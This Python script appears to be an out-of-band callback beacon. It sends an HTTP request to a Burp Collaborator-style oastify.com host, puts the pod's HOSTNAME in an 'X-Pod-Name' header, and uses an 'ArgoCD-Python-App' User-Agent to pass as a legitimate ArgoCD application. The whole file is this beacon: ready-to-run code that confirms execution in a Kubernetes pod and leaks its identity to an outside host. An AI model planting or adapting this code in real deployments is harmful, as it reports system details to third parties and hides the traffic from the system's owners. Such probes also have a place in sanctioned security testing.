#!/usr/bin/env python3
import requests
import time
import os

def make_callback():
    url = "http://czfi4p3gakftz2zlkhbaxtr25tbkzanz.oastify.com"
    
    try:
        headers = {
            'User-Agent': 'ArgoCD-Python-App/1.0',
            'X-Pod-Name': os.getenv('HOSTNAME', 'unknown')
        }
        
        response = requests.get(url, headers=headers, timeout=10)
        print(f"Callback successful: Status {response.status_code}")
        
    except Exception as e:
        print(f"Callback failed: {e}")

if __name__ == "__main__":
    print("Starting callback script...")
    make_callback()
